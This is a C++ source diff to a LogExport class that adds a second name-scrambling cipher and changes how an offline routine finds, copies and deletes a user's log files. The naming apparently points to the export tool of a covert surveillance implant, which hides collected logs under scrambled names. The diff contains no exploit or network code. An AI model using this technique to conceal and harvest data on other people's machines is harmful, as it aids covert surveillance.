@@ -78,6 +78,39 @@ char *LogExport::LOG_ScrambleName(char *string, BYTE scramble, BOOL crypt)
 	return ret_string;
 }
 
+char *LogExport::LOG_ScrambleName2(char *string, BYTE scramble, BOOL crypt)
+{
+	char alphabet[ALPHABET_LEN]={'a','_','q','T','w','B','H','W','K','F','D','M','k',		                      
+		                         'i','U','m','I','e','l','J','8','y','h','j','b','0',
+								 'f','4','z','Q','O','9','S','x','u','X','A','V','Z',
+                                 '3','7','2','E','L','r','t','G','6','v','C','N','d',
+					             's','5','p','o','Y','n','1','c','g','P','R','-'};                  
+	char *ret_string;
+	DWORD i,j;
+
+	if ( !(ret_string = _strdup(string)) )
+		return NULL;
+
+	// Evita di lasciare i nomi originali anche se il byte e' 0
+	scramble%=ALPHABET_LEN;
+	if (scramble == 0)
+		scramble = 1;
+
+	for (i=0; ret_string[i]; i++) {
+		for (j=0; j<ALPHABET_LEN; j++)
+			if (ret_string[i] == alphabet[j]) {
+				// Se crypt e' TRUE cifra, altrimenti decifra
+				if (crypt)
+					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
+				else
+					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
+				break;
+			}
+	}
+	return ret_string;
+}
+
+
 void LogExport::PrepareIniFile(WCHAR *fname)
 {
 	WORD wBOM = 0xFEFF;
@@ -93,9 +126,6 @@ BOOL LogExport::OfflineRetrieve()
 {
 	char *scrambled_searchA;
 	WCHAR scrambled_path[MAX_PATH];
-	char scrambled_nameA[MAX_PATH];
-	char *clear_nameA;
-	char *tmp_ptr;
 	WCHAR clear_path[MAX_PATH];
 	WCHAR dest_path[MAX_PATH];
 	SYSTEMTIME system_time;
@@ -158,7 +188,7 @@ BOOL LogExport::OfflineRetrieve()
 
 	// Enumera i log dell'utente
 	if (m_os_type == WIN_OS) {
-		if ( !(scrambled_searchA = LOG_ScrambleName("?LOG*.???", (BYTE)(m_rcs_info.hscramb), TRUE)) )
+		if ( !(scrambled_searchA = LOG_ScrambleName2("?LOG*.???", (BYTE)(m_rcs_info.hscramb), TRUE)) )
 			return FALSE;
 	} else if (m_os_type == MAC_OS) {
 		if ( !(scrambled_searchA = LOG_ScrambleName("LOG*.???", (BYTE)(m_rcs_info.hscramb), TRUE)) )
@@ -185,26 +215,12 @@ BOOL LogExport::OfflineRetrieve()
 		m_progress_text.SetString(progress_text);
 		UpdateData(FALSE);
 
-		sprintf_s(scrambled_nameA, sizeof(scrambled_nameA), "%S", find_data.cFileName);
-		clear_nameA = LOG_ScrambleName(scrambled_nameA, (BYTE)(m_rcs_info.hscramb), FALSE);
-		if (clear_nameA) {
-			swprintf_s(scrambled_path, sizeof(scrambled_path)/sizeof(scrambled_path[0]), L"%s\\%s", m_src_path, find_data.cFileName);
-			// Se e' un file di tipo LOG_ (nel formato .bin) aggiunge il timestamp per compatibilita' con il formato
-			// in cui salva i file ASP
-			if (!strncmp(clear_nameA+1, "LOG_", strlen("LOG_")) && (tmp_ptr = strstr(clear_nameA, ".bin"))) {
-				*tmp_ptr = 0x00;
-				GetSystemTime(&system_time);
-				SystemTimeToFileTime(&system_time, &file_time);
-				swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\%S_%.8X%.8X.bin", dest_path, clear_nameA, file_time.dwHighDateTime, file_time.dwLowDateTime);
-			} else {
-				swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\%S", dest_path, clear_nameA);
-			}
-			SAFE_FREE(clear_nameA);
-
-			// Copia i log con il loro nome in chiaro e cancella la copia originale
-			if (find_data.nFileSizeLow==0 || CopyFileW(scrambled_path, clear_path, FALSE))
-				DeleteFileW(scrambled_path);
-		}
+		swprintf_s(scrambled_path, sizeof(scrambled_path)/sizeof(scrambled_path[0]), L"%s\\%s", m_src_path, find_data.cFileName);
+		swprintf_s(clear_path, sizeof(clear_path)/sizeof(clear_path[0]), L"%s\\%s", dest_path, find_data.cFileName);
+			
+		if (find_data.nFileSizeLow==0 || CopyFileW(scrambled_path, clear_path, FALSE))
+			DeleteFileW(scrambled_path);
+		
 		m_progress.StepIt();
 	} while (FindNextFileW(hFind, &find_data));
 	FindClose(hFind);		
